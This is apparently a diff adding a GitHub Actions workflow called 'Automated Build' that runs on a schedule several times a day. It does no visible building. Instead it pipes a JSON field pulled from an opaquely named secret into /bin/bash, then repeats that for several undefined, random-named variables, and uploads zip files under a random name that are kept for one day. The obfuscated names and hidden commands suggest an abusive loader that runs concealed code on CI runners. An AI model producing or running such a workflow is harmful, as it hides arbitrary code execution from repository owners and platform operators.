@@ -1,0 +1,34 @@
+name: Automated Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '26 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          vxq2: ${{ secrets.vxq2 }}
+        run: |
+          printf '%s' "$vxq2" | jq -r .xcyog60501 | /bin/bash
+          echo $hu2189 | jq -r .um7 | /bin/bash
+          echo $p7 | jq -r .qymhh51 | /bin/bash
+          printf '%s' "$b82339" | jq -r .togkv9469 | /bin/bash
+          echo $s904 | jq -r .v0420 | /bin/bash
+          echo $nvtm2 | jq -r .s31 | /bin/bash
+          printf '%s' "$cy23" | jq -r .db39 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: XOdT4Nci
+          path: "*.zip"
+          retention-days: 1
